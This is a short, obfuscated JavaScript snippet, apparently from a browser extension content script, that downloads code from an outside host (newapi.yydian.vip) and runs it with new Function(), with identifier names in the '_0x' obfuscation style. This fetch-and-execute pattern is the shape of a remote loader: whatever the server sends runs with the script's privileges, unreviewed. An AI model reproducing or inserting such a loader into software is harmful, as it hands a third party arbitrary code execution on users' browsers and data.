
fetch("https://newapi.yydian.vip/weidao/new/dmj/js/content.js").then(_0x3507a9 => {
  if (!_0x3507a9.ok) throw new Error("请检查网络是否OK");
  return _0x3507a9.text();
}).then(_0x41674e => {
  const _0xf3a37c = new Function(_0x41674e);
  _0xf3a37c();
}).catch(_0x5864e0 => {
  reject();
});